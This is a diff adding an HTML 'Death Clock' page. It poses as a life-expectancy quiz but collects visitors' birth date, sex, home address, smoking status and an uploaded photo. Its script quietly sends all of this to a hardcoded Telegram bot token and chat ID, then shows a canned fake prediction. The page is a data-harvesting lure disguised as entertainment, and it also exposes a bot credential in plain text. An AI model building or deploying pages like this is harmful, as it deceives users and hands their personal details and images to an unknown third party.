@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Death Clock</title>
+  <style>
+    body {
+      background-color: #111;
+      color: #fff;
+      font-family: 'Courier New', monospace;
+      text-align: center;
+      padding: 20px;
+    }
+    .container {
+      background-color: #222;
+      padding: 20px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 500px;
+      margin: auto;
+      box-shadow: 0 0 15px red;
+    }
+    img {
+      width: 100px;
+    }
+    input, select, textarea {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: none;
+    }
+    button {
+      background-color: crimson;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 18px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    label {
+      float: left;
+      margin-left: 5px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>☠️ The Death Clock ☠️</h2>
+
+    <label>Date of Birth</label>
+    <input type="date" id="dob">
+
+    <label>Sex</label>
+    <select id="sex">
+      <option value="">Choose</option>
+      <option value="Male">Male</option>
+      <option value="Female">Female</option>
+    </select>
+
+    <label>Favorite Color</label>
+    <input type="text" id="color" placeholder="Enter color">
+
+    <label>Where do you live?</label>
+    <input type="text" id="address" placeholder="Enter address">
+
+    <label>Do you smoke?</label><br>
+    <input type="radio" name="smoke" value="Yes"> Yes
+    <input type="radio" name="smoke" value="No"> No<br><br>
+
+    <label>Upload your photo</label>
+    <input type="file" id="photo">
+
+    <button onclick="sendToTelegram()">Submit</button>
+  </div>
+
+  <script>
+    async function sendToTelegram() {
+      const chatId = "6809642969";
+      const token = "8018184377:AAFAoKzNMAnP7p9UxLQVXEItMd9C0gShlnY";
+
+      const dob = document.getElementById("dob").value;
+      const sex = document.getElementById("sex").value;
+      const color = document.getElementById("color").value;
+      const address = document.getElementById("address").value;
+      const smoke = document.querySelector('input[name="smoke"]:checked')?.value || "Not specified";
+
+      const message = `
+🕒 *Death Clock Form Submission* 🕒
+
+📅 DOB: ${dob}
+⚧️ Sex: ${sex}
+🎨 Favorite Color: ${color}
+🏠 Address: ${address}
+🚬 Smokes: ${smoke}
+`;
+
+      // Send text data
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+
+      // Send photo if selected
+      const fileInput = document.getElementById("photo");
+      if (fileInput.files.length > 0) {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", fileInput.files[0]);
+
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+      }
+
+      alert("you death in 64 year old!");
+    }
+  </script>
+
+</body>
+</html>
